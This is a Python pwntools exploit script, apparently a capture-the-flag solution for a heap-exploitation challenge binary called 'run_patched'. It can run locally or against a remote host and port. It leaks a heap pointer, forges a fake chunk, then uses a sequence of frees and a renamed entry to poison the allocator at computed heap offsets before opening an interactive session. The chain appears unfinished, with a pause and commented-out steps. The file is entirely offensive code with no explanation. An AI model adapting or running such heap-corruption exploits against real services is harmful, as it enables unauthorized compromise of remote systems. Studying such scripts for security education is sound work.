#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("run_patched")
libc = ELF("libc.so.6")

gs = """
set max-visualize-chunk-size 0x100
# brva 0x1744
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


r = start()


def choice(c: int):
    r.sendlineafter(b'> ', str(c).encode())


def add(user, passwd):
    choice(2)
    r.sendafter(b'> ', user)
    r.sendafter(b'> ', passwd)


def free(user: bytes):
    choice(3)
    r.sendafter(b'> ', user)


def view():
    choice(5)


def change(user: bytes, passwd: bytes):
    choice(4)
    r.sendafter(b'> ', user)
    r.sendafter(b'> ', passwd)


add(b'lynk', b'A' * 8)
view()
r.recvuntil(b'A' * 8)
heap = u64(r.recv(6) + b'\0' * 2) - 0x370
log.info(f'Heap: {hex(heap)}')
add(p64(0), p64(0x691))

for i in range(5):
    choice(1)

add(b'lynk', b'A' * 8)
add(b'lynk1', b'B')
add(b'lynk2', p64(0xd0))
free(b'lynk2')
free(b'lynk1')
free(b'lynk')
free(b'root')
change(p64(heap + 0xeb0), b'A' * 8)
free(p64(heap + 0xeb0))
add(p64(heap+0x580), p64(0))
add(b'X'*8, p64(0))
add(b'Y'*8, p64(0))
free(b'Y'*8)

pause()
choice(1)

# add(b'lynk', b'A' * 8)
# add(b'lynk1', b'B')
# add(b'lynk2', p64(0xd0))
# free(b'lynk2')
# free(b'lynk1')
# free(b'lynk')
# free(b'root')

r.interactive()
